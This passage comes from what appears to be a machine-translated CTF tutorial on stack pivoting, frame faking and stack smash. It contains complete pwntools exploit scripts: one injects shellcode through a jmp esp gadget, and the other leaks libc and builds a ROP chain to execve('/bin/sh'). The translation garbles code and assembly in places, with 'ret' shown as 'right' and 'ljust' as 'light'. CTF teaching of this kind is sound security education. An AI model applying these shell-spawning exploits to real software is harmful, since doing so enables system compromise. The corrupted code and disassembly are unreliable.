<div class="highlight"><pre><span></span><code><span class="kt">signed</span> <span class="kt">int</span> <span class="n">vul</span><span class="p">()</span>

<span class="p">{</span>

  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [sp+18h] [bp-20h]@1</span>



  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">======================&quot;</span><span class="p">);</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">Welcome to X-CTF 2016!&quot;</span><span class="p">);</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">======================&quot;</span><span class="p">);</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;What&#39;s your name?&quot;</span><span class="p">);</span>

  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

  <span class="n">fgets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hello %s.&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>

  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>

<span class="p">}</span>
</code></pre></div>
<p>As you can see, there is a stack overflow vulnerability in the source program. But the only bytes that can overflow are only 50-0x20-4=14 bytes, so it is difficult to implement some better ROPs. Here we consider stack pivoting. Since the program itself does not have stack protection turned on, we can lay out shellcode on the stack and execute it. Basic use ideas are as follows</p>
<ul>
<li>Layout shellcode with stack overflow</li>
<li>Control eip to point to shellcode</li>
</ul>
<p>The first step is still relatively easy to read directly, but since the program itself will open ASLR protection, it is difficult to directly know the address of the shellcode. But the relative offset on the stack is fixed, so we can use the stack overflow to operate on the esp to point to the shellcode and directly control the program to jump to the esp. The following is to find the control program to jump to the gadgets at the esp.</p>
<div class="highlight"><pre><span></span><code>➜  X-CTF Quals <span class="m">2016</span> - b0verfl0w git:<span class="o">(</span>iromise<span class="o">)</span> ✗ ROPgadget --binary b0verfl0w --only <span class="s1">&#39;jmp|ret&#39;</span>         

Gadgets <span class="nv">information</span>

<span class="o">============================================================</span>

0x08048504 : jmp esp

0x0804836a: right
0x0804847e: right 0xeac1


Unique gadgets found: <span class="m">3</span>
</code></pre></div>
<p>Here we find that there is a gadget that can jump directly to esp. Then we can lay out the payload as follows</p>
<div class="highlight"><pre><span></span><code>shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp
</code></pre></div>
<p>Then the last part of our payload changes how to set esp, you can know</p>
<ul>
<li>
<p>size(shellcode+padding)=0x20</p>
</li>
<li>
<p>size(fake ebp)=0x4</p>
</li>
<li>
<p>size(0x08048504)=0x4</p>
</li>
</ul>
<p>So the last step we need to execute is</p>
<div class="highlight"><pre><span></span><code><span class="nf">sub</span> <span class="no">esp</span><span class="p">,</span><span class="mi">0x28</span>

<span class="nf">jmp</span> <span class="no">esp</span>
</code></pre></div>
<p>So the last exp is as follows</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./b0verfl0w&#39;</span><span class="p">)</span>



<span class="n">shellcode_x86</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73</span><span class="s2">&quot;</span>
<span class="n">shellcode_x86</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0</span><span class="s2">&quot;</span>

<span class="n">shellcode_x86</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x0b\xcd\x80</span><span class="s2">&quot;</span>



<span class="n">sub_esp_jmp</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;sub esp, 0x28;jmp esp&#39;</span><span class="p">)</span>

<span class="n">jmp_esp</span> <span class="o">=</span> <span class="mh">0x08048504</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode_x86</span> <span class="o">+</span> <span class="p">(</span>

    <span class="mh">0x20</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode_x86</span><span class="p">))</span> <span class="o">*</span> <span class="s1">&#39;b&#39;</span> <span class="o">+</span> <span class="s1">&#39;bbbb&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">jmp_esp</span><span class="p">)</span> <span class="o">+</span> <span class="n">sub_esp_jmp</span>

<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<h4 id="example-2-transfer-heap">Example 2 - Transfer heap<a class="headerlink" href="#example-2-transfer-heap" title="Permanent link">&para;</a></h4>
<p>Wait.</p>
<h3 id="title">Title<a class="headerlink" href="#title" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/EkoPartyCTF%202016%20fuckzing-exploit-200">EkoPartyCTF 2016 fuckzing-exploit-200</a></li>
</ul>
<h2 id="frame-faking">frame faking<a class="headerlink" href="#frame-faking" title="Permanent link">&para;</a></h2>
<p>As the name suggests, this technique constructs a fake stack frame to control the execution flow of the program.</p>
<h3 id="principle_1">Principle<a class="headerlink" href="#principle_1" title="Permanent link">&para;</a></h3>
<p>In a nutshell, the stack overflow we talked about before is nothing more than two ways.</p>
<ul>
<li>Control program EIP</li>
<li>Control program EBP</li>
</ul>
<p>It ends up being the execution flow of the control program. In frame faking, the trick we use is to control both EBP and EIP, so that we control the execution flow of the program and also change the position of the stack frame. Generally its payload is as follows</p>
<div class="highlight"><pre><span></span><code>buffer padding|fake ebp|leave ret addr|
</code></pre></div>
<p>That is, we use stack overflow to construct the stack as above. Here we mainly talk about the next two parts</p>
<ul>
<li>The return address of the function is overwritten by us to execute the address of the leave ret, which indicates that the function will perform a leave ret again after it has successfully executed its own leave ret.</li>
<li>where fake ebp is the base address of the stack frame we constructed. Note that this is an address. In general, we construct a fake stack frame as follows</li>
</ul>
<div class="highlight"><pre><span></span><code>fake ebp

|

v
ebp2|target function addr|leave ret addr|arg1|arg2
</code></pre></div>
<p>Here our fake ebp points to ebp2, which is the address where ebp2 is located. Generally speaking, this is all readable content that we can control.</p>
<p><strong>The following assembly syntax is the intel syntax. </strong></p>
<p>Before we introduce the basic control process, we still need to talk about the basic operation of the entry and exit points of the function.</p>
<p>Entry point</p>
<div class="highlight"><pre><span></span><code>Push ebp # push ebp
Mov ebp, esp # assign the value of esp to ebp
</code></pre></div>
<p>Exit point</p>
<div class="highlight"><pre><span></span><code>leave

Ret #pop eip, pop the top element of the stack as the next execution address of the program
</code></pre></div>
<p>Where the leave command is equivalent</p>
<div class="highlight"><pre><span></span><code>Mov esp, ebp # assign the value of ebp to esp
Pop ebp # pop ebp
</code></pre></div>
<p>Let&#39;s take a closer look at the basic control process.</p>
<ol>
<li>
<p>When a program with a stack overflow performs leave, it is divided into two steps.</p>
</li>
<li>
<p>mov esp, ebp , which will also point esp to the ebp base address of the current stack overflow vulnerability.</p>
</li>
<li>
<p>pop ebp, which assigns the value of fake ebp stored in the stack to ebp. That is, after executing the instruction, ebp points to ebp2, which is the address where ebp2 is stored.</p>
</li>
<li>
<p>Execute the ret instruction and execute the leave ret instruction again.</p>
</li>
<li>
<p>Execute the leave command, which is divided into two steps</p>
</li>
<li>
<p>mov esp, ebp , which points esp to ebp2.</p>
</li>
<li>
<p>pop ebp, in which case the content of ebp will be set to the value of ebp2, and esp will point to the target function.</p>
</li>
<li>
<p>Execute the ret instruction, at which time the program will execute the target function and execute it when it is running the program.</p>
</li>
<li>
<p>push ebp, which pushes the ebp2 value onto the stack.</p>
</li>
<li>
<p>mov ebp, esp, points ebp to the current base address.</p>
</li>
</ol>
<p>The stack structure at this time is as follows</p>
<div class="highlight"><pre><span></span><code>ebp

|

v
ebp2 | leave ret addr | arg1 | arg2
</code></pre></div>
<ol>
<li>
<p>When the program is executed, it will apply for space normally. At the same time, we also arrange the parameters corresponding to the function on the stack, so the program will execute normally.</p>
</li>
<li>
<p>After the program ends, it will execute leave ret addr twice, so if we have the corresponding content arranged at ebp2, then we can always control the execution flow of the program.</p>
</li>
</ol>
<p>It can be seen that in the fake frame, we have a requirement that we have to have a memory that can be written, and we also know the address of this memory, which is similar to stack pivoting.</p>
<h3 id="2018-over">2018 安恒杯over<a class="headerlink" href="#2018-over" title="Permanent link">&para;</a></h3>
<p>Take the over one of the An Heng Cup monthly competition in June 2018 as an example. The title can be found in [ctf-challenge] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow</a> Found in /fake_frame/over)</p>
<h4 id="file-information">File Information<a class="headerlink" href="#file-information" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code>over.over: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>99beb778a74c68e4ce1477b559391e860dd0e946, stripped

<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/m4x/pwn_repo/others_over/over.over&#39;</span>

    Arch:     amd64-64-little

    RELRO:    Partial RELRO

    Stack:    No canary found

    NX:       NX enabled

FOOT: No FOOT
</code></pre></div>
<p>64-bit dynamically linked program, without PIE and canary protection, but opened
NX protection</p>
<h4 id="_2">分析程序<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h4>
<p>Put it in IDA for analysis
<div class="highlight"><pre><span></span><code><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="n">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>

<span class="p">{</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mf">0L</span><span class="n">L</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mf">0L</span><span class="n">L</span><span class="p">);</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mf">0L</span><span class="n">L</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mf">0L</span><span class="n">L</span><span class="p">);</span>

  <span class="k">while</span> <span class="p">(</span> <span class="n">sub_400676</span><span class="p">()</span> <span class="p">)</span>

    <span class="p">;</span>

  <span class="k">return</span> <span class="mf">0L</span><span class="n">L</span><span class="p">;</span>

<span class="p">}</span>



<span class="kt">int</span> <span class="n">sub_400676</span><span class="p">()</span>

<span class="p">{</span>

  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-50h]</span>



  <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>

  <span class="n">putchar</span><span class="p">(</span><span class="sc">&#39;&gt;&#39;</span><span class="p">);</span>

  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">96uLL</span><span class="p">);</span>

  <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>

<span class="p">}</span>
</code></pre></div></p>
<p>The vulnerability is obvious, read can read 96 bits, but the length of buf is only 80, so it can cover rbp and ret addr but can only cover rbp and ret addr, so it can only be controlled by controlling rbp and ret addr at the same time. Up</p>
<h4 id="leak-stack">leak stack<a class="headerlink" href="#leak-stack" title="Permanent link">&para;</a></h4>
<p>In order to control rbp, we need to know some addresses. We can find that when the input length is 80, since read does not add &#39;\0&#39; to the end of the input, the value of rbp will be printed by puts, so that we can Know the address of all locations on the stack by a fixed offset
<div class="highlight"><pre><span></span><code><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x00000000004006b9</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>

<span class="nl">LEGEND</span><span class="p">:</span> <span class="n">STACK</span> <span class="o">|</span> <span class="n">HEAP</span> <span class="o">|</span> <span class="n">CODE</span> <span class="o">|</span> <span class="n">DATA</span> <span class="o">|</span> <span class="n">RWX</span> <span class="o">|</span> <span class="n">RODATA</span>

<span class="err">───────────────────────────────────────────────────────</span><span class="p">[</span> <span class="n">REGISTERS</span> <span class="p">]</span><span class="err">────────────────────────────────────────────────────────</span>

 <span class="n">RAX</span>  <span class="mh">0x7ffceaf11160</span> <span class="err">◂—</span> <span class="mh">0x3030303030303030</span> <span class="p">(</span><span class="err">&#39;</span><span class="mo">00000000</span><span class="err">&#39;</span><span class="p">)</span>

 <span class="n">RBX</span>  <span class="mh">0x0</span>

 <span class="n">RCX</span>  <span class="mh">0x7ff756e9b690</span> <span class="p">(</span><span class="n">__read_nocancel</span><span class="o">+</span><span class="mi">7</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">cmp</span>    <span class="n">rax</span><span class="p">,</span> <span class="mh">-0xfff</span>

 <span class="n">RDX</span>  <span class="mh">0x60</span>

 <span class="n">RDI</span>  <span class="mh">0x7ffceaf11160</span> <span class="err">◂—</span> <span class="mh">0x3030303030303030</span> <span class="p">(</span><span class="err">&#39;</span><span class="mo">00000000</span><span class="err">&#39;</span><span class="p">)</span>

 <span class="n">RSI</span>  <span class="mh">0x7ffceaf11160</span> <span class="err">◂—</span> <span class="mh">0x3030303030303030</span> <span class="p">(</span><span class="err">&#39;</span><span class="mo">00000000</span><span class="err">&#39;</span><span class="p">)</span>

 <span class="n">R8</span>   <span class="mh">0x7ff75715b760</span> <span class="p">(</span><span class="n">_IO_stdfile_1_lock</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x0</span>

<span class="n">R9</span> <span class="mh">0x7ff757354700</span> <span class="err">◂</span><span class="o">-</span> <span class="mh">0x7ff757354700</span>
 <span class="n">R10</span>  <span class="mh">0x37b</span>

 <span class="n">R11</span>  <span class="mh">0x246</span>

 <span class="n">R12</span>  <span class="mh">0x400580</span> <span class="err">◂—</span> <span class="n">xor</span>    <span class="n">ebp</span><span class="p">,</span> <span class="n">ebp</span>

 <span class="n">R13</span>  <span class="mh">0x7ffceaf112b0</span> <span class="err">◂—</span> <span class="mh">0x1</span>

 <span class="n">R14</span>  <span class="mh">0x0</span>

 <span class="n">R15</span>  <span class="mh">0x0</span>

 <span class="n">RBP</span>  <span class="mh">0x7ffceaf111b0</span> <span class="err">—▸</span> <span class="mh">0x7ffceaf111d0</span> <span class="err">—▸</span> <span class="mh">0x400730</span> <span class="err">◂—</span> <span class="n">push</span>   <span class="n">r15</span>

 <span class="n">RSP</span>  <span class="mh">0x7ffceaf11160</span> <span class="err">◂—</span> <span class="mh">0x3030303030303030</span> <span class="p">(</span><span class="err">&#39;</span><span class="mo">00000000</span><span class="err">&#39;</span><span class="p">)</span>

 <span class="n">RIP</span>  <span class="mh">0x4006b9</span> <span class="err">◂—</span> <span class="n">call</span>   <span class="mh">0x400530</span>

<span class="err">──────────────────────────────────────────────────</span> <span class="err">───────</span> <span class="p">[</span><span class="n">DISASM</span><span class="p">]</span> <span class="err">────────────────────────────────────────</span> <span class="err">─────────────────</span>
 <span class="err">►</span> <span class="mh">0x4006b9</span>    <span class="n">call</span>   <span class="n">puts</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="mh">0x400530</span><span class="o">&gt;</span>

        <span class="nl">s</span><span class="p">:</span> <span class="mh">0x7ffceaf11160</span> <span class="err">◂—</span> <span class="mh">0x3030303030303030</span> <span class="p">(</span><span class="err">&#39;</span><span class="mo">00000000</span><span class="err">&#39;</span><span class="p">)</span>



   <span class="mh">0x4006be</span>    <span class="n">leave</span>

<span class="mh">0x4006bf</span> <span class="n">right</span>


   <span class="mh">0x4006c0</span>    <span class="n">push</span>   <span class="n">rbp</span>

   <span class="mh">0x4006c1</span>    <span class="n">mov</span>    <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>

   <span class="mh">0x4006c4</span>    <span class="n">sub</span>    <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x10</span>

<span class="mh">0x4006c8</span> <span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rbp</span> <span class="o">-</span> <span class="mi">4</span><span class="p">],</span> <span class="n">edi</span>
<span class="mh">0x4006cb</span> <span class="n">mov</span> <span class="n">qword</span> <span class="k">for</span> <span class="p">[</span><span class="n">rbp</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">],</span> <span class="n">rsi</span>
   <span class="mh">0x4006cf</span>    <span class="n">mov</span>    <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rip</span> <span class="o">+</span> <span class="mh">0x20098a</span><span class="p">]</span> <span class="o">&lt;</span><span class="mh">0x601060</span><span class="o">&gt;</span>

<span class="mh">0x4006d6</span> <span class="n">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="mi">0</span>
   <span class="mh">0x4006db</span>    <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span> <span class="mi">2</span>

<span class="err">─────────────────────────────────────────────────────────</span><span class="p">[</span> <span class="n">STACK</span> <span class="p">]</span><span class="err">──────────────────────────────────────────────────────────</span>

<span class="mo">00</span><span class="o">:</span><span class="mo">0000</span><span class="err">│</span> <span class="n">rax</span> <span class="n">rdi</span> <span class="n">rsi</span> <span class="n">rsp</span>  <span class="mh">0x7ffceaf11160</span> <span class="err">◂—</span> <span class="mh">0x3030303030303030</span> <span class="p">(</span><span class="err">&#39;</span><span class="mo">00000000</span><span class="err">&#39;</span><span class="p">)</span>

<span class="p">...</span> <span class="err">↓</span>

<span class="err">───────────────────────────────────────────────────────</span><span class="p">[</span> <span class="n">BACKTRACE</span> <span class="p">]</span><span class="err">────────────────────────────────────────────────────────</span>

 <span class="err">►</span> <span class="n">f</span> <span class="mi">0</span>           <span class="mi">4006</span><span class="n">b9</span>

   <span class="n">f</span> <span class="mi">1</span>           <span class="mi">400715</span>

   <span class="n">f</span> <span class="mi">2</span>     <span class="mf">7f</span><span class="n">f756de02b1</span> <span class="n">__libc_start_main</span><span class="o">+</span><span class="mi">241</span>

<span class="n">Breakpoint</span> <span class="o">*</span><span class="mh">0x4006B9</span>

<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">stack</span> <span class="mi">15</span>

<span class="mo">00</span><span class="o">:</span><span class="mo">0000</span><span class="err">│</span> <span class="n">rax</span> <span class="n">rdi</span> <span class="n">rsi</span> <span class="n">rsp</span>  <span class="mh">0x7ffceaf11160</span> <span class="err">◂—</span> <span class="mh">0x3030303030303030</span> <span class="p">(</span><span class="err">&#39;</span><span class="mo">00000000</span><span class="err">&#39;</span><span class="p">)</span>

<span class="p">...</span> <span class="err">↓</span>

<span class="mi">0</span><span class="nl">a</span><span class="p">:</span><span class="mo">0050</span><span class="err">│</span> <span class="n">rbp</span>              <span class="mh">0x7ffceaf111b0</span> <span class="err">—▸</span> <span class="mh">0x7ffceaf111d0</span> <span class="err">—▸</span> <span class="mh">0x400730</span> <span class="err">◂—</span> <span class="n">push</span>   <span class="n">r15</span>

<span class="mi">0</span><span class="nl">b</span><span class="p">:</span><span class="mo">005</span><span class="mi">8</span><span class="err">│</span>                  <span class="mh">0x7ffceaf111b8</span> <span class="err">—▸</span> <span class="mh">0x400715</span> <span class="err">◂—</span> <span class="n">test</span>   <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>

<span class="mi">0</span><span class="nl">c</span><span class="p">:</span><span class="mo">0060</span><span class="err">│</span>                  <span class="mh">0x7ffceaf111c0</span> <span class="err">—▸</span> <span class="mh">0x7ffceaf112b8</span> <span class="err">—▸</span> <span class="mh">0x7ffceaf133db</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="p">.</span><span class="o">/</span><span class="n">over</span><span class="p">.</span><span class="n">over</span><span class="err">&#39;</span>

<span class="mi">0</span><span class="nl">d</span><span class="p">:</span><span class="mo">006</span><span class="mi">8</span><span class="err">│</span>                  <span class="mh">0x7ffceaf111c8</span> <span class="err">◂—</span> <span class="mh">0x100000000</span>

<span class="mi">0</span><span class="nl">e</span><span class="p">:</span><span class="mo">0070</span><span class="err">│</span>                  <span class="mh">0x7ffceaf111d0</span> <span class="err">—▸</span> <span class="mh">0x400730</span> <span class="err">◂—</span> <span class="n">push</span>   <span class="n">r15</span>

<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">distance</span> <span class="mh">0x7ffceaf111d0</span> <span class="mh">0x7ffceaf11160</span>

<span class="mh">0x7ffceaf111d0</span><span class="o">-&gt;</span><span class="mh">0x7ffceaf11160</span> <span class="n">is</span> <span class="mh">-0x70</span> <span class="n">bytes</span> <span class="p">(</span><span class="mh">-0xe</span> <span class="n">words</span><span class="p">)</span>
</code></pre></div></p>
<p>After leaking the stack address, we can control the program flow by controlling rbp as the address on the stack (such as 0x7ffceaf11160) and ret addr as the address of leave ret.</p>
<p>For example, we can fill in the rop chain of the leak libc at 0x7ffceaf11160 + 0x8 and control it back to the <code>sub_400676</code> function to leak libc.
​    </p>
<p>Then on the next use, you can use the rop to execute <code>system(&amp;quot;/bin/sh&amp;quot;)</code> or <code>execve(&amp;quot;/bin/sh&amp;quot;, 0, 0)</code> to get the shell. This question is because the input is long enough. , we can arrange the use chain of <code>execve(&amp;quot;/bin/sh&amp;quot;, 0, 0)</code>, this method is more secure (<code>system(&amp;quot;/bin/sh&amp;quot;)</code> may be invalidated due to env destruction) , but because the structure of the stack changes during the process, some key offsets need to be determined by debugging.</p>
<h4 id="exp">exp<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./over.over&quot;</span>



<span class="k">def</span> <span class="nf">DEBUG</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>

    <span class="n">raw_input</span><span class="p">(</span><span class="s2">&quot;DEBUG: &quot;</span><span class="p">)</span>

    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>



<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./over.over&quot;</span><span class="p">)</span>

<span class="n">eleven</span> <span class="o">=</span> <span class="n">ELF</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="o">./</span><span class="n">over</span><span class="o">.</span><span class="n">over</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>



<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&quot;&gt;&quot;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">80</span><span class="p">)</span>

<span class="n">stack</span> <span class="o">=</span> <span class="n">u64</span> <span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="n">x7f</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span> <span class="p">[</span><span class="o">-</span> <span class="mi">6</span><span class="p">:]</span> <span class="o">.</span><span class="n">light</span> <span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="o">&amp;</span><span class="c1">#39;0&amp;#39;)) - 0x70</span>
<span class="n">success</span><span class="p">(</span><span class="s2">&quot;stack -&gt; </span><span class="si">{:#x}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>





<span class="c1">#  DEBUG(&quot;b *0x4006B9\nc&quot;)</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&quot;&gt;&quot;</span><span class="p">,</span> <span class="n">flat</span><span class="p">([</span><span class="s1">&#39;11111111&#39;</span><span class="p">,</span> <span class="mh">0x400793</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">],</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">],</span> <span class="mh">0x400676</span><span class="p">,</span> <span class="p">(</span><span class="mi">80</span> <span class="o">-</span> <span class="mi">40</span><span class="p">)</span> <span class="o">*</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="n">stack</span><span class="p">,</span> <span class="mh">0x4006be</span><span class="p">]))</span>

<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x7f</span><span class="s2">&quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:</span> <span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>

<span class="n">success</span><span class="p">(</span><span class="s2">&quot;libc.address -&gt; </span><span class="si">{:#x}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>



<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x400793</span>
<span class="sd">&#39;&#39;&#39;</span>

<span class="sd">$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &amp;quot;pop | ret&amp;quot;</span>
<span class="sd">0x00000000000f5279 : pop rdx ; pop rsi ; ret</span>

<span class="sd">&#39;&#39;&#39;</span>

<span class="n">pop_rdx_pop_rsi_ret</span><span class="o">=</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0xf5279</span>





<span class="n">payload</span><span class="o">=</span><span class="n">flat</span><span class="p">([</span><span class="s1">&#39;22222222&#39;</span><span class="p">,</span> <span class="n">pop_rdi_ret</span><span class="p">,</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">)),</span><span class="n">pop_rdx_pop_rsi_ret</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;execve&#39;</span><span class="p">],</span> <span class="p">(</span><span class="mi">80</span> <span class="o">-</span> <span class="mi">7</span><span class="o">*</span><span class="mi">8</span> <span class="p">)</span> <span class="o">*</span> <span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="n">stack</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x4006be</span><span class="p">])</span>



<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&quot;&gt;&quot;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>



<span class="n">io</span><span class="o">.</span><span class="n">interactive</span> <span class="p">()</span>
</code></pre></div>
<p>In general, this method is not very different from the stack pivot.</p>
<h3 id="reference-reading">Reference reading<a class="headerlink" href="#reference-reading" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p><a href="http://www.xfocus.net/articles/200602/851.html">http://www.xfocus.net/articles/200602/851.html</a></p>
</li>
<li>
<p><a href="http://phrack.org/issues/58/4.html">http://phrack.org/issues/58/4.html</a></p>
</li>
</ul>
<h2 id="stack-smash">Stack smash<a class="headerlink" href="#stack-smash" title="Permanent link">&para;</a></h2>
<h3 id="principle_2">Principle<a class="headerlink" href="#principle_2" title="Permanent link">&para;</a></h3>
<p>After the program is added with canary protection, if the buffer we read overwrites the corresponding value, the program will report an error, and generally we will not care about the error message. The stack smash trick is to use the program that prints this information to get what we want. This is because after the program starts canary protection, if the canary is found to be modified, the program will execute the <code>__stack_chk_fail</code> function to print the string pointed to by the argv[0] pointer. Normally, this pointer points to the program name. Its code is as follows</p>
<div class="highlight"><pre><span></span><code><span class="kt">void</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="k">noreturn</span><span class="p">))</span> <span class="n">__stack_chk_fail</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>

